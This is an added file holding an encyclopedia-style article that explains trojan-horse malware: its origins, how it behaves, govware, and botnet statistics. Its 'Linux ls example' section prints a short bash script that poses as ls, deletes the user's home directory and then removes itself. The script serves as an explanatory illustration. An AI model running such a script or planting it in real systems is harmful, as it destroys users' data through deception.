@@ -1,0 +1,41 @@
+<h1>Wikipedia</h1>
+Trojan Horse (Computing)
+In computing, a trojan horse (or simply trojan;[1] often capitalized,[2] but see below) is a kind of malware that misleads users as to its true intent by disguising itself as a normal program.
+
+Trojans are generally spread by some form of social engineering. For example, a user may be duped into executing an email attachment disguised to appear innocuous (e.g., a routine form to be filled in), or into clicking on a fake advertisement on the Internet. Although their payload can be anything, many modern forms act as a backdoor, contacting a controller who can then have unauthorized access to the affected device.[3] Ransomware attacks are often carried out using a trojan.
+
+Unlike computer viruses and worms, trojans generally do not attempt to inject themselves into other files or otherwise propagate themselves.[4]
+
+Origins of the term
+The term is derived from the ancient Greek story of the deceptive Trojan Horse that led to the fall of the city of Troy.[2]
+
+It is unclear where and when the computing concept, and this term for it, originated; but by 1971 the first Unix manual assumed its readers knew both.[5]
+
+Another early reference is in a US Air Force report in 1974 on the analysis of vulnerability in the Multics computer systems.[6]
+
+The term "Trojan horse" was popularized by Ken Thompson in his 1983 Turing Award acceptance lecture "Reflections on Trusting Trust",[7] subtitled: "To what extent should one trust a statement that a program is free of Trojan horses? Perhaps it is more important to trust the people who wrote the software." He mentioned that he knew about the possible existence of trojans from a report on the security of Multics.[8][9]
+
+Capitalization
+The computer term "Trojan horse" is derived from the legendary Trojan Horse of the ancient city of Troy. For this reason "Trojan" is often capitalized, especially in older sources. However, many modern style guides[10] and dictionaries[1] suggest a lower-case "trojan" for this technical use.
+
+Behavior
+Once installed, trojans may perform a range of malicious actions. Many tend to contact one or more Command and Control (C2) servers across the Internet and await instruction. Since individual trojans typically use a specific set of ports for this communication, it can be relatively simple to detect them. Moreover, other malware could potentially "take over" the trojan, using it as a proxy for malicious action.[11]
+
+In German-speaking countries, spyware used or made by the government is sometimes called govware. Govware is typically used to intercept communications from the target device. Some countries like Switzerland and Germany have a legal framework governing the use of such software.[12][13] Examples of govware trojans include the Swiss MiniPanzer and MegaPanzer[14] and the German "state trojan" nicknamed R2D2.[12] German govware works by exploiting security gaps unknown to the general public and accessing smartphone data before it becomes encrypted via other applications.[15]
+
+Due to the popularity of botnets among hackers and the availability of advertising services that permit authors to violate their users' privacy, trojans are becoming more common. According to a survey conducted by BitDefender from January to June 2009, "Trojan-type malware is on the rise, accounting for 83% of the global malware detected in the world." trojans have a relationship with worms, as they spread with the help given by worms and travel across the internet with them.[16] BitDefender has stated that approximately 15% of computers are members of a botnet, usually recruited by a trojan infection.[17]
+
+Recent investigations have revealed that the trojan-horse method has been used as an attack on cloud computing systems. A trojan attack on cloud systems tries to insert an application or service into the system that can impact the cloud services by changing or stopping the functionalities. When the cloud system identifies the attacks as legitimate, the service or application is performed which can damage and infect the cloud system.[18]
+
+Linux ls example
+A trojan horse is a program that purports to perform some legitimate function, yet upon execution it compromises the user's security.[19] One simple example[20] is the following malicious version of the Linux ls command. An attacker would place this executable script in a publicly writable and "high-traffic" location (e.g., /tmp/ls). Then, any victim who tried to run ls from that directory — if and only if the victim's executable search PATH unwisely[20] included the current directory . — would execute /tmp/ls instead of /usr/bin/ls, and have their home directory deleted.
+
+#!/usr/bin/env bash
+rm -rf ~ 2>/dev/null # Remove the user's home directory, then remove self.
+rm $0
+Similar scripts could hijack other common commands; for example, a script purporting to be the sudo command (which prompts for the user's password) could instead mail that password to the attacker.[19]
+
+In these examples, the malicious program imitates the name of a well-known useful program, rather than pretending to be a novel and unfamiliar (but harmless) program. As such, these examples also resemble typosquatting and supply chain attacks.
+
+
+
